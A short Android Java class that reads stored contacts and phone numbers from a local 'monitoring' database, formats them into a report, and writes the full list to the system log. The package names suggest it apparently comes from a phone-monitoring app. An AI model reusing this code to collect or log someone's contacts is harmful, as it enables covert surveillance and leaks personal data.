package circle.internet.block;

import java.util.ArrayList;

import com.android.os.R;
import circle.db.controllers.MonitorSQLiteAdapter;
import circle.db.models.Contacts;
import circle.db.models.Number;

import android.content.Context;
import android.util.Log;

public class ContactBlock {

	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;
	private static final String LOG_TAG = "monitoring";

	public static String getContact(int settingContact, Context context) {

		String contactsList = "";
		try {
			if (settingContact != 0) {
				ArrayList<Contacts> contacts = mAdapter.selectContact();
				ArrayList<circle.db.models.Number> numbers = mAdapter.selectNumber();
				String list = "";
				for (Contacts contact : contacts) {
					list += contact.getContactId() + ": \n";
					for (Number number : numbers) {
						if (contact.getContactId()
								.equals(number.getContactId())) {
							list += number.getNumber() + "\n";
						}
					}
					list += "------------------------------\n";
				}
				Log.i(LOG_TAG, "list- " + list);
				contactsList += list;
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		if (!contactsList.equals("")) {
			String contacts = context.getResources().getString(
					R.string.contacts);
			return contacts + " :\n\n\n" + contactsList;
		}
		return "";
	}
}
